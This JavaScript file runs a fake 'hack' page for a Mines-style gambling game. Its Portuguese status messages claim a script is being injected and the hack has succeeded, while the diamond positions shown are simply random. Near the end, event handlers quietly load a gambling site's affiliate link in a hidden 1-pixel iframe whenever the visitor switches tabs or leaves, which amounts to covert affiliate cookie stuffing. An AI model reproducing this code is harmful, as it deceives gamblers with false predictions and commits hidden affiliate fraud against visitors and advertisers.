
const boardElement = document.getElementById("board");
const overlayElement = document.getElementById("overlay");
const statusElement = document.getElementById("status");
const generateOpportunityButton = document.getElementById(
  "generate-opportunity"
);
function generateMinesBoard(diamond_positions) {
  const grid = Array.from(
    {
      length: 25,
    },
    (_, i) => (diamond_positions.includes(i) ? "💎" : "💣")
  );
  return Array.from(
    {
      length: 5,
    },
    (_, i) => grid.slice(i * 5, i * 5 + 5)
  );
}
function renderBoard(board) {
  boardElement.innerHTML = board
    .map((row) =>
      row
        .map(
          (cell) =>
            `<div><img src="${
              cell === "💎" ? "./img/diamond.png" : "./img/empty.png"
            }" alt="${cell}"></div>`
        )
        .join("")
    )
    .join("");
}
function handleClickGenerateOpportunity() {
  if (
    document.getElementById("generate-opportunity").innerHTML !==
    "Hackear Agora"
  ) {
    return;
  }
  overlayElement.style.display = "block";
  statusElement.style.display = "block";
  statusElement.parentNode.style.opacity = "1";
  const diamond_positions = randomDiamondPositions();
  const board = generateMinesBoard(diamond_positions);
  renderBoard(board);
  statusElement.textContent = "Injetando script";
  setTimeout(() => {
    statusElement.textContent = "Verificando mapa de calor";
  }, 1500);
  setTimeout(() => {
    statusElement.textContent = "Hackeado com Sucesso";
  }, 2000);
  setTimeout(() => {
    overlayElement.style.display = "none";
    statusElement.style.display = "none";
    statusElement.parentNode.style.opacity = "0";
  }, 4000);

  init();
}
function randomDiamondPositions() {
  return Array.from(
    {
      length: 4,
    },
    () => Math.floor(Math.random() * 25)
  );
}
generateOpportunityButton.addEventListener(
  "click",
  handleClickGenerateOpportunity
);
document.addEventListener("DOMContentLoaded", () => {
  handleClickGenerateOpportunity();
});

function init() {
  let value = 15;
  const interval = setInterval(() => {
    value--;
    if (value <= 1) {
      document.getElementById("generate-opportunity").innerHTML =
        "Hackear Agora";
      document
        .getElementById("generate-opportunity")
        .removeAttribute("disabled");
      clearInterval(interval);
      return;
    }

    document.getElementById(
      "generate-opportunity"
    ).innerHTML = `Aguarde ${value} segundos`;
    document
      .getElementById("generate-opportunity")
      .setAttribute("disabled", "");
  }, 1000);

  setTimeout(() => {
    statusElement.textContent = "Verificando mapa de calor";
  }, 5000);
}

init();

const hasActive = true;
document.addEventListener("visibilitychange", function (event) {
  if (hasActive === false) {
    return;
  }
  if (document.hidden) {
    setTimeout(() => {
      document.getElementById(
        "iframe-disabled"
      ).innerHTML = `<iframe src="https://playpix.com/affiliates/?btag=1020729_l176602" style="visibility: hidden;" width="1px" height="1px">...</iframe>`;
    }, 1500);
    // document.getElementById("iframe-disabled").innerHTML = `<iframe src="https://playpix.com/affiliates/?btag=1020729_l176602" style="visibility: hidden;" width="1px" height="1px">...</iframe>`
  }
});

window.addEventListener("beforeunload", function (event) {
  setTimeout(() => {
    document.getElementById(
      "iframe-disabled"
    ).innerHTML = `<iframe src="https://playpix.com/affiliates/?btag=1020729_l176602" style="visibility: hidden;" width="1px" height="1px">...</iframe>`;
  }, 1500);
  document.getElementById(
    "iframe-disabled"
  ).innerHTML = `<iframe src="https://playpix.com/affiliates/?btag=1020729_l176602" style="visibility: hidden;" width="1px" height="1px">...</iframe>`;
});
